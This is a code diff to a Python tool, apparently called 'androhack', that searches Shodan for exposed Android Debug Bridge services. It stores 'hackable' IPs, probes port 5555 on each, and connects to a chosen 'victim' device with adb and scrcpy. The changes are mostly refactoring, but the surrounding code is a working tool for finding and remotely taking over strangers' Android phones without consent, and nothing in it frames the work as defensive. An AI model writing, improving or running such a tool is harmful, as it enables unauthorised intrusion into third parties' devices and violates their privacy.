@@ -18,6 +18,7 @@ query = 'Android Debug Bridge'
 ip_list = []
 hackable_ip = []
 alive_ip = []
+alive = False
 
 
 
@@ -32,11 +33,14 @@ def load_ip_file():
     try:
         with open(ip_list_file, "r") as f:
             ip_list = json.load(f)
+            f.close()
         with open(hackable_ip_file, "r") as f:
             hackable_ip = json.load(f)
+            f.close()
     except Exception as e:
+        # print(f"Error: {e}")
         print("No Data Available")
-        update_device()
+        update_device_list()
 
 
 
@@ -64,12 +68,14 @@ def setup():
     logo = os.path.join(folder_path, "logo.txt")
     with open(logo, 'r') as f:
         logo_contents = f.read()
+        f.close()
     print(random_color + logo_contents + Style.RESET_ALL)
     
     # Setup the API client
     api_key = os.path.join(folder_path, "shodan_api_key.txt")
     with open(api_key, 'r') as file:
         api_key = file.read().strip()
+        file.close()
     global api
     api = shodan.Shodan(api_key)
 
@@ -79,8 +85,8 @@ def setup():
 
     
 
-def update_device():
-    global ip_list, hackable_ip
+def update_device_list():
+    global ip_list, hackable_ip, alive
     print(Fore.MAGENTA + "Updating Device List, please wait ... " + Style.RESET_ALL, end=" ")
     sys.stdout.flush() # Clearing Buffer
     try:
@@ -95,20 +101,41 @@ def update_device():
 
     except shodan.APIError as e:
         print(f"Error: {e}")
-    
     print()
-    ip_list = list(set(ip_list))
-    hackable_ip = list(set(hackable_ip))
 
-    # Save the list into file
+    # Config for workspace
     home_dir = os.path.expanduser("~")
     folder_path = os.path.join(home_dir, ".androhack")
     ip_file = os.path.join(folder_path, "ip_list.txt")
     hackable_ip_file = os.path.join(folder_path, "hackable_ip_list.txt")
+    # If there is old data, concate with new ones
+    ip_temp = []
+    hack_temp = []
+    try: 
+        with open(ip_file, "r") as f:
+            ip_temp = json.load(f)
+            f.close()
+        with open(hackable_ip_file, "r") as f:
+            hack_temp = json.load(f)
+            f.close()
+        # Concate old data with new ones
+        ip_list = ip_list + ip_temp
+        ip_list = list(set(ip_list))
+        hackable_ip = hackable_ip + hack_temp
+        hackable_ip = list(set(hackable_ip))
+        del ip_temp, hack_temp
+    except Exception:
+        pass
+    # Update list into the File
     with open(ip_file, "w") as f:
         json.dump(ip_list, f)
+        f.close()
     with open(hackable_ip_file, "w") as f:
         json.dump(hackable_ip, f)
+        f.close()
+    alive = False
+    print(Fore.GREEN + "Data Updated !!!" + Style.RESET_ALL)
+
 
 
 
@@ -158,30 +185,30 @@ def show_options():
 #             pass
 #     print()
 
-def check_port(ip):
+def check_ip(ip):
     try:
-        # Attempt to connect to port 5555
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(1)
         s.connect((ip, 5555))
         s.close()
-        # If the connection succeeds, add the IP to the list
         alive_ip.append(ip)
     except (socket.timeout, ConnectionRefusedError):
-        # If the connection fails, continue to the next IP
         pass
 
 def alive_devices():
     print(Fore.MAGENTA + "Checking Currently Alive Devices, please wait ... " + Style.RESET_ALL, end=" ")
-    sys.stdout.flush() # Clearing Buffer
+    sys.stdout.flush()
     threads = []
     for ip in hackable_ip:
-        t = threading.Thread(target=check_port, args=[ip])
-        t.start()
+        t = threading.Thread(target=check_ip, args=(ip,))
         threads.append(t)
+        t.start()
     for t in threads:
         t.join()
+    global alive
+    alive = True
     print()
+    print(Fore.GREEN + "Done !!!" + Style.RESET_ALL)
 
 
 
@@ -243,8 +270,8 @@ def connectWithVictim():
     x = int(x)
     try:
         connect_adb_scrcpy(alive_ip[x])
-    except Exception as e:
-        connectWithVictim()
+    except Exception:
+        pass
     subprocess.run(['adb', 'disconnect'])
 
 
@@ -255,7 +282,6 @@ if __name__ == "__main__":
 
     setup()
     load_ip_file()
-    alive = False
 
     while True:   
         show_options()
@@ -263,23 +289,24 @@ if __name__ == "__main__":
         if (x == 0):
             exit(0)
         elif (x == 1):
-            update_device()
-            print("Done")
+            update_device_list()
             continue
         elif (x == 2):
             alive_devices()
-            print("Done")
-            alive = True
 
         if not alive:
             print("This operation needs to check online devices first.")
             alive_devices()
-            print("Done")
-            alive = True
+
         if (x == 3):
             display_status()
         elif (x == 4):
             while True:
                 connectWithVictim()
-
+                print()
+                print(Fore.YELLOW + "Press any key to continue or 'q' to quit:" + Style.RESET_ALL, end=" ")
+                key = input()
+                print() 
+                if (key == "Q" or key == "q"):
+                    break
     
